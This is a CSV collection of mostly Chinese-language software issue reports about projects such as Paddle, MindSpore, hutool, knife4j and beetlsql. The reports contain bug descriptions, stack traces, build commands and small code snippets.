title,text
动态图 BatchNorm 中 bias_attr 指定有误,"错误位置： https://github.com/PaddlePaddle/Paddle/blob/9bd44b94da0d82a25d1810b48997d1c6170514aa/python/paddle/fluid/dygraph/nn.py#L1055 https://github.com/PaddlePaddle/Paddle/blob/9bd44b94da0d82a25d1810b48997d1c6170514aa/python/paddle/fluid/dygraph/nn.py#L1077 应为：   <code>: self._bias_attr = bias_attr attr=self._bias_attr,"
[bug] 关于 validateExtUrl 取值 bug,"当然多个swagger_resources时，extBasePath 只会取第一个swagger_resource作为校验地址。导致其他swagger_resource无法配置增强。   <code>: var extBasePath=""""; var idx=newUrl.indexOf(""/v2/api-docs""); if(idx&gt;0){ //增强地址存在basePath extBasePath=newUrl.substr(0,idx); } that.log(""增强basePath地址：""+extBasePath); //赋值增强地址 g.extUrl=extBasePath+that.extUrl+""?group=""+group.name; if(that.validateExtUrl==""""){ that.validateExtUrl=g.extUrl; } //如果开启SwawggerBootstrapUi增强,则判断当前后端是否启用注解 if(enableSbuFlag){ var api=that.validateExtUrl; var idx=api.indexOf(""/""); if(idx==0){ api=api.substr(1); } ... }"
感谢作者开源的这款产品！,很早就关注过hutool，公司的项目也正在被我集成hutool工具包，很不错的一款开发工具包。 在我的开源项目JustAuth中就用到了hutool的模块。 之前都是用的hutool4.1.21版本，最近会发布1.8.0版本，hutool会升级到4.5.15 感兴趣的朋友可以关注一下。   <code>: hutool-http JustAuth v1.7.1
TargetAdditional的有效作用范围问题,"目前在尝试架构多租户，使用TargetAdditional，发现TargetAdditional在一些场景不生效。 环境代码： 执行正常： 执行报错： 另外，我认为多租户的实现，优于，只需要扩展NameConversion支持TargetAdditional扩展就可以达到效果，不需要再定义toTable方法，还要设置虚拟表。   <code>: @Tenant public static class TenantUser { } @SqlResource(""tenant"") public interface TenantUserMapper extends BaseMapper&lt;TenantUser&gt; { public LambdaQuery&lt;TenantUser&gt; getTenantUser(); } tenant.md getTenantUser === SELECT * FROM tenantUser where tenantId=#{tenantId} String sql = ""SELECT * FROM tenantUser where tenantId=#{tenantId}""; List&lt;TenantUser&gt; data = sqlManager.execute(sql, TenantUser.class, new HashMap()); SqlId sqlId = SqlId.of(""tenant"", ""getTenantUser""); sqlManager.select(sqlId, TenantUser.class); 变量未定义(VAR_NOT_DEFINFD) SqlId sqlId = SqlId.of(""tenant"", ""getTenantUser""); PageResult&lt;TenantUser&gt; pageResult = sqlManager.pageQuery(sqlId, TenantUser.class, new HashMap(), DefaultPageRequest.of(1, 10)); LambdaQuery&lt;TenantUser&gt; query = tenantUserMapper.getTenantUser(); query.select(); @Table(name = ""${schema}.tenantUser"") @Table(name = ""${toTable('sys_user')}"")"
菜单联动问题,"在首页点击按钮，进入新的页面，菜单无联动，标签栏无新增，该怎么写才会达到联动效果   <code>: function stuInf(){ window.location.href=""/qyz/studentNew/stuIof/2399""; /*$.modal.openTab(""个人信息"", prefix + ""/stuIof/"" + 2399);*/ }"
多级联动第一次调用数据的时候很卡,"const/crud/a.js 级联代码如上，根据类型选择不同状态，在点击查看或者编辑按钮弹框的时候会， 调用接口common/getStatus去获取状态数据，这个时候界面会有3-5秒的卡顿。 查看和编辑 都是用的默认 this.$refs.crud.rowView(row, index); this.$refs.crud.rowEdit(row, index); 以下是谷歌请求截图 请教大神这是什么情况，/common/getStatus 这个接口在弹窗的时候调用了104次...   <code>: export const tableOption = { props: { label: 'name', value: 'code' }, column: [ { label: '类型', prop: 'types', type: 'select', solt: true, sortable: true, addVisdiplay: false, editVisdiplay: false, cascader: ['status'], cascaderFirst: true, dicUrl: `/common/getType`, dicData:'types' }, { label: '状态', prop: 'status', type: 'select', solt: true, sortable: true, addVisdiplay: false, editVisdiplay: false, dicUrl: `/common/getStatus/{{key}}`, dicData:'status' }, ] }"
2.0.1版本启动失败报springfox.documentation.spring.web.plugins.DocumentationPluginsManager.createContextBuilder,"POM文件引用方法是 com.github.xiaoymin knife4j-spring-boot-starter 2.0.1 报错信息为： 2020-02-04 01:50:50.430 INFO 11632 --- [ restartedMain] c.m.m.c.config.SwaggerConfiguration : 是否开启swagger：true 2020-02-04 01:50:50.802 INFO 11632 --- [ restartedMain] o.s.s.concurrent.ThreadPoolTaskExecutor : Initializing ExecutorService 'applicationTaskExecutor' 2020-02-04 01:50:50.859 INFO 11632 --- [ restartedMain] o.s.b.d.a.OptionalLiveReloadServer : LiveReload server is running on port 35729 2020-02-04 01:50:51.686 INFO 11632 --- [ restartedMain] o.s.s.c.ThreadPoolTaskScheduler : Initializing ExecutorService 'taskScheduler' 2020-02-04 01:50:51.938 INFO 11632 --- [ restartedMain] d.s.w.p.DocumentationPluginsBootstrapper : Context refreshed 2020-02-04 01:50:51.983 INFO 11632 --- [ restartedMain] d.s.w.p.DocumentationPluginsBootstrapper : Found 1 custom documentation plugin(s) 2020-02-04 01:50:51.989 WARN 11632 --- [ restartedMain] ConfigServletWebServerApplicationContext : Exception encountered during context initialization - cancelling refresh attempt: org.springframework.context.ApplicationContextException: Failed to start bean 'documentationPluginsBootstrapper'; nested exception is java.lang.NoSuchMethodError: org.springframework.plugin.core.PluginRegistry.getPluginFor(Ljava/lang/Object;Lorg/springframework/plugin/core/Plugin;)Lorg/springframework/plugin/core/Plugin; 2020-02-04 01:50:51.990 INFO 11632 --- [ restartedMain] o.s.s.c.ThreadPoolTaskScheduler : Shutting down ExecutorService 'taskScheduler' 2020-02-04 01:50:51.990 INFO 11632 --- [ restartedMain] o.s.s.concurrent.ThreadPoolTaskExecutor : Shutting down ExecutorService 'applicationTaskExecutor' 2020-02-04 01:50:51.999 INFO 11632 --- [ restartedMain] j.LocalContainerEntityManagerFactoryBean : Closing JPA EntityManagerFactory for persistence unit 'default' 2020-02-04 01:50:52.004 INFO 11632 --- [ restartedMain] com.alibaba.druid.pool.DruidDataSource : {dataSource-1} closing ... 2020-02-04 01:50:52.008 INFO 11632 --- [ restartedMain] com.alibaba.druid.pool.DruidDataSource : {dataSource-1} closed 2020-02-04 01:50:52.012 INFO 11632 --- [ restartedMain] o.apache.catalina.core.StandardService : Stopping service [Tomcat] 2020-02-04 01:50:52.028 INFO 11632 --- [ restartedMain] ConditionEvaluationReportLoggingListener : Error starting ApplicationContext. To display the conditions report re-run your application with 'debug' enabled. 2020-02-04 01:50:52.032 ERROR 11632 --- [ restartedMain] o.s.b.d.LoggingFailureAnalysisReporter : APPLICATION FAILED TO START Description: An attempt was made to call a method that does not exist. The attempt was made from the following location: The following method did not exist: The method's class, org.springframework.plugin.core.PluginRegistry, is available from the following locations: It was loaded from the following location: Action: Correct the classpath of your application so that it contains a single, compatible version of org.springframework.plugin.core.PluginRegistry 请大侠指点一点。   <code>: springfox.documentation.spring.web.plugins.DocumentationPluginsManager.createContextBuilder(DocumentationPluginsManager.java:152) org.springframework.plugin.core.PluginRegistry.getPluginFor(Ljava/lang/Object;Lorg/springframework/plugin/core/Plugin;)Lorg/springframework/plugin/core/Plugin; jar:file:/C:/Users/toby/.m2/repository/org/springframework/plugin/spring-plugin-core/2.0.0.RELEASE/spring-plugin-core-2.0.0.RELEASE.jar!/org/springframework/plugin/core/PluginRegistry.class file:/C:/Users/toby/.m2/repository/org/springframework/plugin/spring-plugin-core/2.0.0.RELEASE/spring-plugin-core-2.0.0.RELEASE.jar"
order by 的字段自动转下划线驼峰命名导致自建表无法排序,"如果mysql表中有字段是符合驼峰命名的，那么在对该字段进行排序的时候，PageDomain::getOrderBy会将该字段转成下划线分段的，例如UserID会转成user_id，实际数据库中确实是UserID，从而导致无法对该字段进行排序； 如果去掉转换，系统内的自带功能则会被破坏； 能否添加一个注解，类似，可以选择让某个函数或者某个BaseController的继承的order by字段不进行转换 或者给BaseController添加一个属性，可以控制是否进行转换。   <code>: public String getOrderBy() { if (StringUtils.isEmpty(orderByColumn)) { return """"; } return StringUtils.toUnderScoreCase(orderByColumn) + "" "" + isAsc; } @DataSource"
Add target_link_libraries for cc_library,"It will fix #2728:Don't merge!!Just test teamcity!. Maybe it is silly to for static library, because a static library do not need to link other libraries. But it will tell cmake how to propagate dependencies. The solution comes from here.   <code>: target_link_libraries"
IR Mutator and Pattern matcher,"RFC Add a recursive IR Mutator (optionally mutable or immutable) with a pattern matcher to find/replace node(s). kind/feature Currently, the optimizers are applied using queues for todo &amp; visited nodes inside a while loop ( function in ). To build a new optimizer the developer must create a new class inheriting from and individually check node by node if they match certain criteria in order to be replaced by the desired result. There are actually two steps, the first one is using the function, which verifies if the corresponds to a specific Primitive and if the nodes are compatible with some specified functions. The second step is within the overridden function, which is triggered by , where the developer writes the code to detect if the node should be replaced or not. Currently, this mechanism requires storing nodes in auxiliary variables that later will be checked to confirm the match. A simple scenario is shown in the image below ( class in ) Notes: To allow for cycles or ""diamond shapes"" in the graph, there's a map of node-&gt;mutated_node that blocks the recursion in case the node has already been mutated. To ease the migration or the parallel use of AnfMutator with the existing code, there's also a function that works recursively and calls the Mutate function when there's a match. The Patter Matcher As discussed in ... Trail No. Task Description Related Issue(URL) 1 2   <code>: ApplyTransform opt.cc AnfVisitor Match CNode Visit Match AddByZero arithmetic_simplify.cc Match Visit operator() AnfMutator AnfMutator Match"
【BUG】集群部署下多个节点可能产生相同的ID,"IdGen中的 其中workerId和datacenterID不应为静态   <code>: IdWorker idWorker = new IdWorker(-1, -1);"
是否兼容Tomcat9， JDK1.8,"在Tomcat9和JDK8环境下，运行始终报错 麻烦作者指教一下如何修改，谢谢！   <code>: 10-Oct-2017 20:16:50.334 严重 [ajp-nio-8009-exec-21] org.apache.catalina.core.StandardWrapperValve.invoke Servlet.service() for servlet [jsp] in context with path [/pages] threw exception [Unable to compile class for JSP: An error occurred at line: [14] in the generated java file: [C:\Tomcat\work\Catalina\jsherp\pages\org\apache\jsp\common\main_jsp.java] Only a type can be imported. com.jsh.util.Tools resolves to a package An error occurred at line: [6] in the jsp file: [/common/main.jsp] Tools cannot be resolved 3: &lt;% 4: String path = request.getContextPath(); 5: String basePath = request.getScheme()+""://""+request.getServerName()+"":""+request.getServerPort()+path+""/""; 6: String clientIp = Tools.getLocalIp(request); 7: %&gt; 8: &lt;!DOCTYPE html&gt; 9: &lt;html&gt;"
Discuz! X 官方 Git 编码转换工具 bug,Git\lib_Convert.cmd Git\Run.cmd 两个批处理有错误，导致转码失败，希望官方修复   <code>: ..\..\lib\convert\convert /q /i:%1 /o:%2 /f:%4 %%i\*.* @echo ·转换编码 call ..\lib\_Convert.cmd UTF8 GBK SC_GBK D call ..\lib\_Convert.cmd UTF8 UTF8 TC_UTF8 T xcopy /y/e dir_SC_UTF8\upload\api\addons dir_SC_GBK\upload\api\addons &gt;&gt;log xcopy /y/e dir_SC_UTF8\upload\api\addons dir_TC_UTF8\upload\api\addons &gt;&gt;log xcopy /y/e dir_SC_UTF8\upload\template\default\m dir_SC_GBK\upload\template\default\m &gt;&gt;log xcopy /y/e dir_SC_UTF8\upload\template\default\m dir_TC_UTF8\upload\template\default\m &gt;&gt;log xcopy /y/e ..\lib\image_big5 dir_TC_UTF8\upload\static\image &gt;&gt;log ..\lib\php\php ..\lib\php\setvt.php
多个元素一样的上传问题,"那么问题来了，请问我如何在data提交id参数值便于服务器端区分，id = $("".input-file"").attr('id');这样肯定是不行，获取到的肯定是第一个input 的ID值image1，显然image2和image3的上传都没办法了， 我真的是被逼疯了，想通过change的变动触发后再执行upload.render，可问题是放在函数里就死了没反应！！！ 应该在done上传提交参数的时候整一个获取当前提交元素的值，不然都不能用上传   <code>: &lt;input type=""file"" class=""input-file"" name=""image1"" id=""image1""/&gt; &lt;input type=""file"" class=""input-file"" name=""image2"" id=""image2""/&gt; &lt;input type=""file"" class=""input-file"" name=""image3"" id=""image3""/&gt; var id = $("".input-file"").attr('id'); var uploadInst = upload.render({ elem: '.input-file' //这样绑定元素 ,url: url //上传接口 ,data: {id: id} ,done: function(res){"
【众智】【计算-AICPU开发】EuclideanNorm,EuclideanNorm 计算euclidean norm keep_dims Bool 属性 x axes y 对应底层算子 对应底层AICPU算子EuclideanNorm Classify Name Type Type Range Required Format INPUT x NumberType TRUE INPUT axes IndexNumberType TRUE OUTPUT y NumberType TRUE ATTR keep_dims Bool FALSE 标杆接口参考 Tensorflow接口： https://www.tensorflow.org/api_docs/python/tf/raw_ops/EuclideanNorm 3. 异常处理 4. 算子反向 参考Tensorflow算子反向实现_EuclideanNormGrad。 目录：tensorflow\tensorflow\python\ops\math_grad.py   <code>: class EuclideanNorm(Primitive):
[CT][MS][CI]Fatal Python error: Bus error,": /device ascend + pynative /device gpu + pynative : -- MindSpore version : -- Python version : -- OS platform and distribution : -- GCC/Compiler version : test_highgrad_control.py test_highgrad_operations.py test_highgrad_layernorm.py --gpu pytest -sqv test_highgrad_control.py Describe heading texthe current behavior pass   <code>: ../high_grad/test_highgrad_control.py::test_highgrad_control_if_mul PASSED [ 20%] ../high_grad/test_highgrad_control.py::test_highgrad_control_while Fatal Python error: Bus error Thread 0x0000ffff5af4b160 (most recent call first): File ""/root/archiconda3/envs/vm3.7/lib/python3.7/threading.py"", line 300 in wait File ""/root/archiconda3/envs/vm3.7/lib/python3.7/threading.py"", line 552 in wait File ""/root/archiconda3/envs/vm3.7/lib/python3.7/threading.py"", line 1175 in run File ""/root/archiconda3/envs/vm3.7/lib/python3.7/threading.py"", line 926 in _bootstrap_inner File ""/root/archiconda3/envs/vm3.7/lib/python3.7/threading.py"", line 890 in _bootstrap Current thread 0x0000ffff9a02a010 (most recent call first): File ""/root/archiconda3/envs/vm3.7/lib/python3.7/site-packages/mindspore/common/api.py"", line 359 in end_graph File ""/root/archiconda3/envs/vm3.7/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 372 in __call__ File ""/root/archiconda3/envs/vm3.7/lib/python3.7/site-packages/mindspore/ops/composite/base.py"", line 354 in _pynative_forward_run File ""/root/archiconda3/envs/vm3.7/lib/python3.7/site-packages/mindspore/ops/composite/base.py"", line 373 in after_grad File ""/root/archiconda3/envs/vm3.7/lib/python3.7/site-packages/mindspore/common/api.py"", line 75 in wrapper File ""/home/jenkins-slave/workspace/ME_Excutor_Featrue_Daily_EulerOS_A_K_Server_OpenSource_Pynative/MindSporeTest/share/grad.py"", line 27 in construct File ""/root/archiconda3/envs/vm3.7/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 326 in run_construct File ""/root/archiconda3/envs/vm3.7/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 368 in __call__ File ""/home/jenkins-slave/workspace/ME_Excutor_Featrue_Daily_EulerOS_A_K_Server_OpenSource_Pynative/MindSporeTest/share/grad.py"", line 85 in construct File ""/root/archiconda3/envs/vm3.7/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 326 in run_construct File ""/root/archiconda3/envs/vm3.7/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 368 in __call__ File ""/home/jenkins-slave/workspace/ME_Excutor_Featrue_Daily_EulerOS_A_K_Server_OpenSource_Pynative/MindSporeTest/high_grad/test_highgrad_control.py"", line 45 in forward_mindspore_impl File ""/home/jenkins-slave/workspace/ME_Excutor_Featrue_Daily_EulerOS_A_K_Server_OpenSource_Pynative/MindSporeTest/high_grad/test_highgrad_control.py"", line 63 in forward_cmp File ""/home/jenkins-slave/workspace/ME_Excutor_Featrue_Daily_EulerOS_A_K_Server_OpenSource_Pynative/MindSporeTest/high_grad/test_highgrad_control.py"", line 109 in test_highgrad_control_while File ""/root/archiconda3/envs/vm3.7/lib/python3.7/site-packages/_pytest/python.py"", line 167 in pytest_pyfunc_call File ""/root/archiconda3/envs/vm3.7/lib/python3.7/site-packages/pluggy/callers.py"", line 187 in _multicall File ""/root/archiconda3/envs/vm3.7/lib/python3.7/site-packages/pluggy/manager.py"", line 87 in &lt;lambda&gt; File ""/root/archiconda3/envs/vm3.7/lib/python3.7/site-packages/pluggy/manager.py"", line 93 in _hookexec File ""/root/archiconda3/envs/vm3.7/lib/python3.7/site-packages/pluggy/hooks.py"", line 286 in __call__ File ""/root/archiconda3/envs/vm3.7/lib/python3.7/site-packages/_pytest/python.py"", line 1445 in runtest File ""/root/archiconda3/envs/vm3.7/lib/python3.7/site-packages/_pytest/runner.py"", line 134 in pytest_runtest_call File ""/root/archiconda3/envs/vm3.7/lib/python3.7/site-packages/pluggy/callers.py"", line 187 in _multicall File ""/root/archiconda3/envs/vm3.7/lib/python3.7/site-packages/pluggy/manager.py"", line 87 in &lt;lambda&gt; File ""/root/archiconda3/envs/vm3.7/lib/python3.7/site-packages/pluggy/manager.py"", line 93 in _hookexec File ""/root/archiconda3/envs/vm3.7/lib/python3.7/site-packages/pluggy/hooks.py"", line 286 in __call__ File ""/root/archiconda3/envs/vm3.7/lib/python3.7/site-packages/_pytest/runner.py"", line 210 in &lt;lambda&gt; File ""/root/archiconda3/envs/vm3.7/lib/python3.7/site-packages/_pytest/runner.py"", line 237 in from_call File ""/root/archiconda3/envs/vm3.7/lib/python3.7/site-packages/_pytest/runner.py"", line 210 in call_runtest_hook File ""/root/archiconda3/envs/vm3.7/lib/python3.7/site-packages/_pytest/runner.py"", line 185 in call_and_report File ""/root/archiconda3/envs/vm3.7/lib/python3.7/site-packages/_pytest/runner.py"", line 99 in runtestprotocol File ""/root/archiconda3/envs/vm3.7/lib/python3.7/site-packages/_pytest/runner.py"", line 84 in pytest_runtest_protocol File ""/root/archiconda3/envs/vm3.7/lib/python3.7/site-packages/pluggy/callers.py"", line 187 in _multicall File ""/root/archiconda3/envs/vm3.7/lib/python3.7/site-packages/pluggy/manager.py"", line 87 in &lt;lambda&gt; File ""/root/archiconda3/envs/vm3.7/lib/python3.7/site-packages/pluggy/manager.py"", line 93 in _hookexec File ""/root/archiconda3/envs/vm3.7/lib/python3.7/site-packages/pluggy/hooks.py"", line 286 in __call__ File ""/root/archiconda3/envs/vm3.7/lib/python3.7/site-packages/_pytest/main.py"", line 271 in pytest_runtestloop File ""/root/archiconda3/envs/vm3.7/lib/python3.7/site-packages/pluggy/callers.py"", line 187 in _multicall File ""/root/archiconda3/envs/vm3.7/lib/python3.7/site-packages/pluggy/manager.py"", line 87 in &lt;lambda&gt; File ""/root/archiconda3/envs/vm3.7/lib/python3.7/site-packages/pluggy/manager.py"", line 93 in _hookexec File ""/root/archiconda3/envs/vm3.7/lib/python3.7/site-packages/pluggy/hooks.py"", line 286 in __call__ File ""/root/archiconda3/envs/vm3.7/lib/python3.7/site-packages/_pytest/main.py"", line 247 in _main File ""/root/archiconda3/envs/vm3.7/lib/python3.7/site-packages/_pytest/main.py"", line 197 in wrap_session File ""/root/archiconda3/envs/vm3.7/lib/python3.7/site-packages/_pytest/main.py"", line 240 in pytest_cmdline_main File ""/root/archiconda3/envs/vm3.7/lib/python3.7/site-packages/pluggy/callers.py"", line 187 in _multicall File ""/root/archiconda3/envs/vm3.7/lib/python3.7/site-packages/pluggy/manager.py"", line 87 in &lt;lambda&gt; File ""/root/archiconda3/envs/vm3.7/lib/python3.7/site-packages/pluggy/manager.py"", line 93 in _hookexec File ""/root/archiconda3/envs/vm3.7/lib/python3.7/site-packages/pluggy/hooks.py"", line 286 in __call__ File ""/root/archiconda3/envs/vm3.7/lib/python3.7/site-packages/_pytest/config/__init__.py"", line 93 in main File ""/root/archiconda3/envs/vm3.7/bin/pytest"", line 10 in &lt;module&gt;"
MindSpore 1.8.0 导出 air 报错,"导出air时报错TypeError: Object of type 'NoneType' is not an instance of 'function'。具体版本信息已在下面列出。 / 硬件环境: /device ascend : -- MindSpore version : 1.8.0 master_20220612181547 -- CANN version：5.1.RC2.B030 -- Python version : 3.9.2 -- OS platform and distribution : Linux arm -- GCC/Compiler version : (/): /mode graph   <code>: Traceback (most recent call last): File ""/data/xiefeng/code/version_tests/3.0.RC2-b023/ctpn_mindspore/inside_train.py"", line 190, in main train_with_args(args_opt) File ""/data/xiefeng/code/version_tests/3.0.RC2-b023/ctpn_mindspore/inside_train.py"", line 230, in train_with_args air_file = trans_ckpt_to_air(args_opt, device_id) File ""/data/xiefeng/code/version_tests/3.0.RC2-b023/ctpn_mindspore/model_wrapper/train_utils.py"", line 38, in trans_ckpt_to_air export_main(device_id=device_id, File ""/data/xiefeng/code/version_tests/3.0.RC2-b023/ctpn_mindspore/model_wrapper/export_wrapper.py"", line 46, in export_main export(net, img, file_name=air_file, file_format=args.file_format) File ""/usr/local/python3.9.2/lib/python3.9/site-packages/mindspore/train/serialization.py"", line 907, in export _export(net, file_name, file_format, *inputs, **kwargs) File ""/usr/local/python3.9.2/lib/python3.9/site-packages/mindspore/train/serialization.py"", line 930, in _export _save_air(net, file_name, *inputs, **kwargs) File ""/usr/local/python3.9.2/lib/python3.9/site-packages/mindspore/train/serialization.py"", line 973, in _save_air _executor.export(file_name, graph_id) File ""/usr/local/python3.9.2/lib/python3.9/site-packages/mindspore/common/api.py"", line 1226, in export export_graph(file_name, 'AIR', graph_id, encrypt_func, enc_key) TypeError: Object of type 'NoneType' is not an instance of 'function'"
Change Paddle RelWithDebInfo Flags,"We need set 's C/CXX flags from to , since we always use in the production environment.   <code>: RelWithDebInfo -O2 -g -O3 -g -O3"
cmake 如何指定-O2,cmake 如何指定-O2 目前我是这样编译的   <code>: cmake -DCMAKE_INSTALL_PREFIX=./output/ -DCMAKE_BUILD_TYPE=Release -DWITH_PYTHON=ON -DWITH_MKL=OFF -DWITH_GPU=OFF -DWITH_FLUID_ONLY=ON -DPYTHON_INCLUDE_DIR=$PYTHONROOT/include/python2.7/ -DPYTHON_LIBRARY=$PYTHONROOT/lib/libpython2.7.so -DPYTHON_EXECUTABLE=$PYTHONROOT/bin/python2.7 -DWITH_PSLIB=ON ..
【众智】【计算-AICPU开发】SparseSoftmaxCrossEntropyWithLogits,"SparseSoftmaxCrossEntropyWithLogits 验收规格： 支持类型为float16、floa32 （1）float16 满足精度误差为：loss=5e-3 （任务跟踪 https://gitee.com/ascend/modelzoo/issues/I5MQV0） （2）float32 满足标准误差 1.1 功能介绍 非稀疏算子，计算 softmax 交叉熵损失和梯度 1.2 接口描述 Python 层接口 接口目录：mindspore/ops/operations/sparse_ops.py class SparseSoftmaxCrossEntropyWithLogits(Primitive): 1.3 异常处理 1.4 算子反向   <code>: REG_OP(SparseSoftmaxCrossEntropyWithLogits) .INPUT(features, TensorType({DT_FLOAT16,DT_FLOAT})) .INPUT(labels, TensorType({DT_INT32, DT_INT64})) .OUTPUT(loss, TensorType({DT_FLOAT16,DT_FLOAT})) .OUTPUT(backprop, TensorType({DT_FLOAT16,DT_FLOAT})) .OP_END_FACTORY_REG(SparseSoftmaxCrossEntropyWithLogits)"
"增强 pigx-common-feign,增加 feign endpoint","环境信息 pigx版本: 3.8 是否修改包名: 否 访问 服务:port/actuator/feign 可以输出当前服务的所有有效的 feginclient 及method url 等关键信息， 支持 spring boot admin 展示   <code>: @Endpoint(id = ""feign"") +public class FeignClientEndpoint implements SmartInitializingSingleton {}"
InvoiceApi.InsertCardToBag出现72031异常，order_id is empty,"提交个bug，调用方法Senparc.Weixin.MP.AdvancedAPIs.InvoiceApi.InsertCardToBag出现异常，order_id都正确，如下log： 改成自己的post方法则没有问题，所有参数都正确。望核实解决。   <code>: 微信 POST 请求发生错误！错误代码：72031，说明：invalid params, order_id is empty hint: [uedqhA00131565] ===&gt;&gt; 在 Senparc.Weixin.CommonAPIs.CommonJsonSend.&lt;&gt;c.&lt;.cctor&gt;b__6_1(String apiUrl, String returnText) 在 Senparc.CO2NET.HttpUtility.Post.PostGetJson[T](IServiceProvider serviceProvider, String url, CookieContainer cookieContainer, Stream fileStream, Encoding encoding, X509Certificate2 cer, Boolean useAjax, Boolean checkValidationResult, Action`2 afterReturnText, Int32 timeOut) 在 Senparc.Weixin.CommonAPIs.CommonJsonSend.Send[T](String accessToken, String urlFormat, Object data, CommonJsonSendType sendType, Int32 timeOut, Boolean checkValidationResult, JsonSetting jsonSetting) 在 Senparc.Weixin.MP.AdvancedAPIs.InvoiceApi.&lt;&gt;c__DisplayClass24_0.&lt;InsertCardToBag&gt;b__0(String accessToken) 在 Senparc.Weixin.CommonAPIs.ApiHandlerWapper.ApiHandlerWapperBase.TryCommonApiBase[T](PlatformType platformType, Func`1 accessTokenContainer_GetFirstOrDefaultAppIdFunc, Func`2 accessTokenContainer_CheckRegisteredFunc, Func`3 accessTokenContainer_GetAccessTokenResultFunc, Int32 invalidCredentialValue, Func`2 fun, String accessTokenOrAppId, Boolean retryIfFaild) 在 Senparc.Weixin.MP.ApiHandlerWapper.TryCommonApi[T](Func`2 fun, String accessTokenOrAppId, Boolean retryIfFaild)"
selectCountByExample  使用Criteria处理带条件的where查询  在解析成sql的时候，不能自动转成 下划线 形式的字段,"前提： 数据库中不同表之间有使用驼峰规则命名表的属性字段 也有使用下划线形式命名属性字段 这个前提导致不能整体配置某一规则 问题： 表中的字段定义： varchar(100) 设置where条件： criteria.andEqualTo(""companyUuid"",companyUuid); 解析的sql: SELECT COUNT(*) FROM company WHERE companyUuid = ? 可不可以定义一个注解，直接作用在表对应的实体上，在解析sql的时候自动转换 company_uuid   <code>: company_uuid"
"OSError: (External) CUDNN error(8), CUDNN_STATUS_EXECUTION_FAILED在启动文本识别训练时出现的错误，同为一个数据集，文本检测可以跑！这是什么问题还请各位伙伴们帮忙看看","OSError: (External) CUDNN error(8), CUDNN_STATUS_EXECUTION_FAILED. [Hint: 'CUDNN_STATUS_EXECUTION_FAILED'. The GPU program failed to execute. This is usually caused by a failure to launch some cuDNN kernel on the GPU, which can occur for multiple reasons. To correct, check that the hardware, an appropriate version of the driver, and the cuDNN library are correctly installed. Otherwise, this may indicate an internal error/bug in the library. ] (at ..\paddle/fluid/operators/rnn_op.cu.cc:873)   <code>: core.dygraph_run_backward([self], [grad_tensor], retain_graph,"
导入解析excel报错,"JDK版本： jdk 1.8.0_151 hutool版本： 5.4.15.8.5(最新亦有问题) 导入解析excel报错 Caused by: java.lang.NoSuchMethodError: org.apache.poi.ss.usermodel.Cell.getCellType()Lorg/apache/poi/ss/usermodel/CellType; at cn.hutool.poi.excel.cell.CellUtil.getCellValue(CellUtil.java:98) at cn.hutool.poi.excel.cell.CellUtil.getCellValue(CellUtil.java:66) at cn.hutool.poi.excel.RowUtil.readRow(RowUtil.java:76) at cn.hutool.poi.excel.RowUtil.readRow(RowUtil.java:50) at cn.hutool.poi.excel.reader.AbstractSheetReader.readRow(AbstractSheetReader.java:138) at cn.hutool.poi.excel.reader.MapSheetReader.read(MapSheetReader.java:53) at cn.hutool.poi.excel.reader.MapSheetReader.read(MapSheetReader.java:19) at cn.hutool.poi.excel.ExcelReader.read(ExcelReader.java:375) at cn.hutool.poi.excel.ExcelReader.read(ExcelReader.java:319) at cn.hutool.poi.excel.ExcelReader.readAll(ExcelReader.java:302) 不同方法导入都是一个错误 截图   <code>: // controller file ::: MultipartFile ExcelReader reader = ExcelUtil.getReader(file.getInputStream()); List&lt;Map&lt;String, Object&gt;&gt; mapList = reader.readAll();"
